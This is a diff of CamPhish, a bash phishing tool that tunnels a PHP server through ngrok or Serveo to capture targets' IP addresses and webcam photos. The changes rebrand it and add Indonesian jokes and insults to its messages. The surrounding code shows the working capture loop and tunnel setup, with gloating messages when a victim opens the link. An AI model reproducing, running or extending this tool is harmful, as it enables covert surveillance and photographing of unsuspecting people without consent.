@@ -1,6 +1,6 @@
 #!/bin/bash
 # CamPhish v1.7
-# Powered by TechChip > Irsyah
+# Powered by Irsyah
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
 trap 'printf "\n";stop' 2
@@ -15,8 +15,17 @@ printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | 
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish V. 1.7.5 \e[0m \n"
-printf " \e[1;77m IrsyahNuri >Opewwwwwww | CyberHack \e[0m \n"
+printf " \e[1;93m CamPhish Ver 1.7 \e[0m \n"
+printf " \e[1;91m Tools Name : SAP-SAP.TOOLS > PAZ.Pemuda Akhir Zaman | CyberHack :> \e[0m \n"
+
+
+printf " \e[1;92m Bro Bahagiakan Orang Tuamu Dulu , Jangan Dia Dulu \e[0m \n"
+
+printf " \e[1;77m #belum Saatnya \e[0m \n"
+
+printf " \e[1;92m LEBIH BAIK MENGEJAR PRESTASI >> DARI PADA DIA YANG TIDAK PASTI << Aiwah Cokkk \e[0m \n"
+
+printf " \e[1;77m #jODOH TUH DAH DITENTUKAN =＾● ⋏ ●＾=  \e[0m \n"
 
 printf "\n"
 
@@ -26,7 +35,7 @@ printf "\n"
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting. LAH LU MAH :>"; exit 1; }
  
 
 
@@ -66,12 +75,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets, Tunggunya Ambil Ngopi Dah\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!YAHAHA Dia Sudah KeJebak\n"
 catch_ip
 rm -rf ip.txt
 
@@ -80,7 +89,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!Tuh Dah Ke Simpen Fotonya\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -92,9 +101,9 @@ done
 
 server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting. Maka nya inst :>all Dulu Jangan Ke Dia  Mulu"; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo Sever Hatinya...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -110,7 +119,7 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server Bukan PHP In Dia yehhh... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
@@ -139,7 +148,7 @@ rm -rf index3.html
 
 select_template() {
 if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+printf "\e[1;93m [!] Invalid tunnel option! try again Aiwah Cok Yang bener dong\e[0m\n"
 sleep 1
 clear
 banner
@@ -173,8 +182,8 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting.Aiwah Cok"; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting.Awah Cok"; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -199,7 +208,7 @@ unzip ngrok-v3-stable-linux-arm64.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-v3-stable-linux-arm64.zip
 else
-printf "\e[1;93m[!] Download error...\e[0m\n"
+printf "\e[1;93m[!] Download error...TOLOLL\e[0m\n"
 exit 1
 fi
 elif [[ $arch4 == *'Darwin'* ]] ; then
@@ -221,7 +230,7 @@ unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-v3-stable-linux-amd64.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "\e[1;93m[!] Download error... Lahhh\e[0m\n"
 exit 1
 fi
 fi
@@ -229,30 +238,30 @@ fi
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
 printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
 cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken Bukan Ganti Dia Yee? [Y/n]:\e[0m ' chg_token
 if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken Lu mah: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed Nice\n"
 fi
 else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken Lu mah: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server Bukan PHP In dia yeh...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server very Gang very well gak begang gak weel...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+printf "\e[1;31m[!] Direct link is not generating, check following possible reason lahh  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid lu mah\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on alamakkk\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok lah lumah\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection Modal Dulu Bos\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -270,18 +279,18 @@ printf "\n-----Choose tunnel server----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option Plih satu Jangan Dua ntar Disangka Selingkuh: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting. Lah Lu mah"; exit 1; }
 start
 
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;93m [!] Invalid option!Baca Tolol\e[0m\n"
 sleep 1
 clear
 camphish
@@ -313,7 +322,7 @@ start() {
 default_choose_sub="Y"
 default_subdomain="saycheese$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain?bukan dia (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
